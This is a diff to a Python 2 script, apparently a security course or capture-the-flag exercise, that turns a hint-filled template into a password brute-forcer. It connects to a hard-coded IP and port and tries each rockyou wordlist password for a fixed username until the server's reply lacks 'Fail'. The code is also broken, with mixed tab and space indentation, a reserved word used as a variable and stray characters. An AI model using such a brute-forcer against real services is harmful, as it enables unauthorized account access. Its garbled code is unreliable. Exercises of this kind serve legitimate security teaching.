@@ -23,53 +23,35 @@
     Feel free to optimize the code (ie. multithreading, etc) if you feel it is necessary.
 
 """
-
 import socket
 import re
 import sys
 
+host = '142.93.117.193'
+port = 1337
+wordlist= "/Downloads/rockyou.txt"
 
-host = "142.93.117.193" # IP address here
-port = 1337 # Port here
-wordlist = "/usr/share/wordlists/rockyou.txt" # Point to wordlist file
+def brute_force(username,pswd):
 
-def brute_force(username, password):
+    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    print "Trying "+username+": "+pswd
+    s.connect((host,port))
+    data = s.recv(1024)
+    	print(str(data))
+    s.send(username + '\n')
+    data = s.recv(1024)
+    	print(str(data))
+    s.send(pswd + '\n')
+    data = s.recv(1024)
+    	print(str(data))
+    s.close()
+    return str(data)
+username = "kruegster"
 
-    #    Sockets: https://docs.python.org/2/library/socket.html
-    #    How to use the socket s:
-
-            # Establish socket connection
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            print "[*] Trying "+username+":"+password
-            s.connect((host, port))
-
-        #    Reading:
-
-            data = s.recv(1024)     # Receives 1024 bytes from IP/Port
-            s.send('USER' + username + '\r\n')
-            data = s.recv(1024)
-            s.send('PASS' + password + '\r\n')
-            data = s.recv(3)
-            s.send('QUIT\r\n')
-            s.close()
-            return data            # Prints data
-
-            #Sending:
-
-            #s.send("something to send\n")   # Send a newline \n at the end of your command
-
-    #    General idea:
-
-    #        Given that you know a potential username, use a wordlist and iterate
-    #        through each possible password and repeatedly attempt to login to
-    #        the Briong server.
-
-
-username = "cstoneairlines"
-passwords = ["test","backup","password"]  # Hint: use wordlist
-
-for pswd in passwords:
-    try=brute_force(username,password)
-    if try == "230" :|
-        print"[*] Password Found: "+password
-        sys.exit(0)
+with open("rockyou.txt") as f:
+    for pswd in f:
+            	result = brute_force(username, pswd)
+            	print(result)
+   	 if "Fail" not in result:
+   		 print "Password Found: "+pswd
+   		 sys.exit(0)
